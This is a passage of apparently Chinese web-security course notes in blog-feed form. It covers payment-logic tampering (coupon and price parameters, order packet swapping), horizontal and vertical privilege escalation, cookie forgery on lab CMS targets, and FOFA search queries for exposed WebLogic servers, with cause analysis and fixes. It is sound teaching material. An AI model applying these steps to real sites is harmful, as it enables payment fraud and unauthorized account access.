src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210425866.png" alt="image-20230307210425866"></p><p>其中&amp;use_coupon&#x3D;参数代表是否使用了优惠券</p><p>没有优惠券后，将0改为1</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307211240231.png" alt="image-20230307211240231"></p><p>价格少了1000</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307211318559.png" alt="image-20230307211318559"></p><p>当用完了优惠券时，而上一张优惠券的id是4</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221348703.png" alt="image-20230307221348703"></p><p>可以在没有优惠券的情况下修改&amp;use_coupon&#x3D;6</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221553239.png" alt="image-20230307221553239"></p><p>修改后发包发现价格同样减少</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221646125.png" alt="image-20230307221646125"></p><p>同样存在，以低价格购买高价格，如将订单10000块和1000的数据包抓取</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223438661.png" alt="image-20230307223438661"></p><p>   将10000的数据包和1000的替换</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223322702.png" alt="image-20230307223322702"></p><p>最后支付价格变成了1000</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223539620.png" alt="image-20230307223539620"></p><h5 id="某实例-演示站交易支付逻辑安全"><a href="#某实例-演示站交易支付逻辑安全" class="headerlink" title="#某实例-演示站交易支付逻辑安全"></a>#某实例-演示站交易支付逻辑安全</h5><p>奇乐CMS</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230308131551166.png" alt="image-20230308131551166"></p><p>修改成6</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230308131641740.png" alt="image-20230308131641740"></p><h5 id="代码审计-业务支付逻辑-amp-安全修复"><a href="#代码审计-业务支付逻辑-amp-安全修复" class="headerlink" title="#代码审计-业务支付逻辑&amp;安全修复"></a>#代码审计-业务支付逻辑&amp;安全修复</h5><p>1、金额以数据库定义为准（不接受修改的值）</p><p>此处价格可变量，可以修改，导致产生漏洞</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230308132202566.png" alt="image-20230308132202566"></p><p>2、购买数量限制为正整数</p><p>3、优惠券固定使用后删除</p><p>4、订单生成后检测对应值</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day49 WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证</title>
      <link href="/2023/02/03/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/"/>
      <url>/2023/02/03/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、水平越权-同级用户权限共享</p><p>2、垂直越权-低高用户权限共享</p><p>3、访问控制-验证丢失&amp;取消验证</p><p>4、脆弱验证-Cookie&amp;Token&amp;Jwt等</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><h4 id="1、逻辑越权原理"><a href="#1、逻辑越权原理" class="headerlink" title="1、逻辑越权原理-"></a>1、逻辑越权原理-</h4><p>-水平越权：用户信息获取时未对用户与ID比较判断直接查询等</p><p>-垂直越权：数据库中用户类型编号接受篡改或高权限操作未验证等</p><h4 id="2、访问控制原理"><a href="#2、访问控制原理" class="headerlink" title="2、访问控制原理-"></a>2、访问控制原理-</h4><p>-验证丢失：未包含引用验证代码文件等</p><p>-取消验证：支持空口令,匿名,白名单等</p><h4 id="3、脆弱验证原理"><a href="#3、脆弱验证原理" class="headerlink" title="3、脆弱验证原理-"></a>3、脆弱验证原理-</h4><p>-Cookie&amp;Token&amp;Jwt：不安全的验证逻辑等</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/0.png" alt="img"></p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p> ➢ 权限-水平越权-YXCMS-检测数据比对弱</p><p>➢ 权限-垂直越权-MINICMS-权限操作无验证</p><p>➢ 未授权-访问控制-XHCMS-代码未引用验证</p><p>➢ 未授权-脆弱机制-XHCMS-Cookie脆弱验证</p><p>➢ 弱机制-空口令机制-Redis&amp;Weblogic弱机制</p><p>➢ 检测类-工具项目-Authz&amp;Secscan-Authcheck</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="权限-水平越权-YXCMS-检测数据比对弱"><a href="#权限-水平越权-YXCMS-检测数据比对弱" class="headerlink" title="#权限-水平越权-YXCMS-检测数据比对弱"></a>#权限-水平越权-YXCMS-检测数据比对弱</h4><p>只检测用户和ID对应关系，没检测当前操作用户是不是当前用户</p><p>环境靶场：YXCMS</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213349543.png" alt="image-20230221213349543"></p><p>进入会员中心</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213446404.png" alt="image-20230221213446404"></p><p>点击修改信息，用burp抓包，更改信息为别的用户，如数据库中的xiaodi002用户，并更改相关信息，id不知道的情况下可以猜测</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213824477.png" alt="image-20230221213824477"></p><p>查看原始数据库中的信息，原本xiaodi002的相关的信息</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213544894.png" alt="image-20230221213544894"></p><p>burpsuite改完发包成功</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221214157953.png" alt="image-20230221214157953">刷新数据库，发现数据库中的xiaodi002用户信息被修改了为了burp中修改的数据，实现了水平越权</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221214309835.png" alt="image-20230221214309835"></p><p>漏洞原因：</p><p>在源码中找到用户名参数并跟踪nickname,发现接收的nickname 不是固定用户名，而是可变变量</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221220557785.png" alt="image-20230221220557785"></p><h4 id="权限-垂直越权-MINICMS-权限操作无验证"><a href="#权限-垂直越权-MINICMS-权限操作无验证" class="headerlink" title="#权限-垂直越权-MINICMS-权限操作无验证"></a>#权限-垂直越权-MINICMS-权限操作无验证</h4><p>后台数据包访问先执行后判断登录等于无效</p><p>1、有验证 逻辑顺序搞错了</p><p>此处的漏洞原因是2</p><p>环境靶场：minicms</p><p>发布一篇文章</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234220860.png" alt="image-20230221234220860"></p><p>复制回收(删除)文章的链接地址</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234315010.png" alt="image-20230221234315010"></p><p>用另一个浏览器打开登录地址，但是未登录</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234443265.png" alt="image-20230221234443265"></p><p>粘贴访问回收的地址，发现刚才发布的1111文章被删除了，实现了垂直越权</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234532508.png" alt="image-20230221234532508"></p><h6 id="漏洞成因分析审计："><a href="#漏洞成因分析审计：" class="headerlink" title="漏洞成因分析审计："></a>漏洞成因分析审计：</h6><p>主要的问题就在于权限判断是在head.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;On&quot;</span>); <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../mc-files/mc-conf.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;mc_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;mc_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$token</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$mc_config</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&#x27;_&#x27;</span>.<span class="variable">$mc_config</span>[<span class="string">&#x27;user_pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:index.php&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在post.php和page.php都出现了这么一个问题，等到他们本身的php代码都执行完之后，才在第188行进行require：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">&#x27;head.php&#x27;</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而如果要进行文章删除的功能，在require之前的代码中执行，因为造成了垂直越权的文章删除</p><h4 id="未授权-访问控制-XHCMS-代码未引用验证"><a href="#未授权-访问控制-XHCMS-代码未引用验证" class="headerlink" title="#未授权-访问控制-XHCMS-代码未引用验证"></a>#未授权-访问控制-XHCMS-代码未引用验证</h4><p>2、没有验证 触发当前操作的用户权限</p><p>在代码中注释掉这行验证登录的代码文件</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222220928870.png" alt="image-20230222220928870"></p><p>访问后台地址登录将会直接登录成功</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222220814779.png" alt="image-20230222220814779"></p><h4 id="未授权-脆弱机制-XHCMS-Cookie脆弱验证"><a href="#未授权-脆弱机制-XHCMS-Cookie脆弱验证" class="headerlink" title="#未授权-脆弱机制-XHCMS-Cookie脆弱验证"></a>#未授权-脆弱机制-XHCMS-Cookie脆弱验证</h4><p>3、有验证 验证产生在用户凭据证上  cookie jwt token</p><p>app&#x3D;”熊海内容管理系统(SEACMS)”</p><p>环境靶场：xhcms</p><p>通过代码审计得知，只要cookie认证是user&#x3D;&#x3D;不为空即可</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203214454269-55199108.png" alt="img"></p><p>（1）找到后台登录入口</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203215154512-368398547.png" alt="img"></p><p>（2）抓包，添加cookie</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203215310917-857953540.png" alt="img"></p><p>（3）成功进入后台</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203221319545-338237601.png" alt="img"></p><h4 id="弱机制-空口令机制-Redis-amp-Weblogic弱机制"><a href="#弱机制-空口令机制-Redis-amp-Weblogic弱机制" class="headerlink" title="#弱机制-空口令机制-Redis&amp;Weblogic弱机制"></a>#弱机制-空口令机制-Redis&amp;Weblogic弱机制</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><a href="https://vulhub.org/">https://vulhub.org/</a></p><p>“weblogic” &amp;&amp; port&#x3D;”7001”</p><p>redis未授权漏洞产生原因，复现案例：(<a href="https://blog.csdn.net/dreamthe/article/details/123427989">https://blog.csdn.net/dreamthe/article/details/123427989</a>)</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222221444489.png" alt="image-20230222221444489"></p><p>weblogic未授权漏洞产生原因，复现案例：(<a href="https://blog.csdn.net/qq_32731075/article/details/117673410">https://blog.csdn.net/qq_32731075/article/details/117673410</a>)</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222222429046.png" alt="image-20230222222429046"></p><h4 id="检测类-工具项目-Authz-amp-Secscan-Authcheck"><a href="#检测类-工具项目-Authz-amp-Secscan-Authcheck" class="headerlink" title="#检测类-工具项目-Authz&amp;Secscan-Authcheck"></a>#检测类-工具项目-Authz&amp;Secscan-Authcheck</h4><p>中通安装踩坑：<a href="https://bigyoung.cn/posts/250/">https://bigyoung.cn/posts/250/</a>   </p><p>(<a href="https://sec.bigyoung.cn/article/SecScanAuthcheck/">https://sec.bigyoung.cn/article/SecScanAuthcheck/</a>)</p><p><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a></p><blockquote><p>黑盒测试流程</p><p>（1）先通过工具把所以域名爆破出来，看看有没有含义敏感数据的页面</p><p>（2）在功能点测试中，修改所有和权限挂钩的参数，尝试判断存不存在越权漏洞</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法</title>
      <link href="/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
      <url>/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Python-反序列化函数使用</p><p>2、Python-反序列化魔术方法</p><p>3、Python-反序列化POP链构造</p><p>4、Python-自动化审计bandit使用</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><h5 id="函数使用："><a href="#函数使用：" class="headerlink" title="函数使用："></a>函数使用：</h5><p>pickle.dump(obj, file) : 将对象序列化后保存到文件</p><p>pickle.load(file) : 读取文件， 将文件中的序列化内容反序列化为对象</p><p>pickle.dumps(obj) : 将对象序列化成字符串格式的字节流</p><p>pickle.loads(bytes_obj) : 将字符串格式的字节流反序列化为对象</p><h5 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h5><p><strong>reduce</strong>()      反序列化时调用</p><p><strong>reduce_ex</strong>()   反序列化时调用</p><p><strong>setstate</strong>()    反序列化时调用</p><p><strong>getstate</strong>()    序列化时调用</p><h5 id="各类语言函数："><a href="#各类语言函数：" class="headerlink" title="各类语言函数："></a>各类语言函数：</h5><p>Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等</p><p>PHP： serialize()、 unserialize() </p><p>Python：pickle marshal PyYAML shelve PIL unzip</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 原理-反序列化魔术方法-调用理解</p><p>➢ CTF-反序列化漏洞利用-构造&amp;RCE</p><p>➢ CTF-CISCN2019华北-JWT&amp;反序列化</p><p>➢ 代码审计-自动化工具-bandit安装及使用</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="原理-反序列化魔术方法-调用理解"><a href="#原理-反序列化魔术方法-调用理解" class="headerlink" title="#原理-反序列化魔术方法-调用理解"></a>#原理-反序列化魔术方法-调用理解</h4><p>-魔术方法利用：</p><p><strong>reduce</strong>()         反序列化时调用</p><p><strong>reduce_ex</strong>()   反序列化时调用</p><p><strong>setstate</strong>()       反序列化时调用</p><p><strong>getstate</strong>()       序列化时调用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-代码块：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">##### \#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span 